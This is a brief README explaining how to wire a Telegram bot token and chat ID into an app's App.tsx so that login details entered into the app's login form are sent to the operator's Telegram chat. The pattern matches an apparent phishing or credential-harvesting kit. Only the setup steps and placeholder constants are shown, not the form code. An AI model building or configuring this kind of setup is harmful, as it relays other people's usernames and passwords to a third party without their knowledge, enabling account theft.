# Telegram Bot Configuration

To set up your Telegram bot:

1. Create a new bot using BotFather on Telegram:
   - Open Telegram and search for @BotFather
   - Send the command `/newbot`
   - Follow the instructions to create your bot
   - BotFather will give you a token (keep this private)

2. Get your Chat ID:
   - Send a message to @userinfobot on Telegram
   - It will reply with your Chat ID

3. Update the App.tsx file with your bot token and chat ID:
   ```typescript
   const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your token
   const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';     // Replace with your chat ID
   ```

4. Test your bot:
   - Submit the login form
   - You should receive a message in your Telegram with the login details

Note: Keep your bot token private and never commit it to public repositories.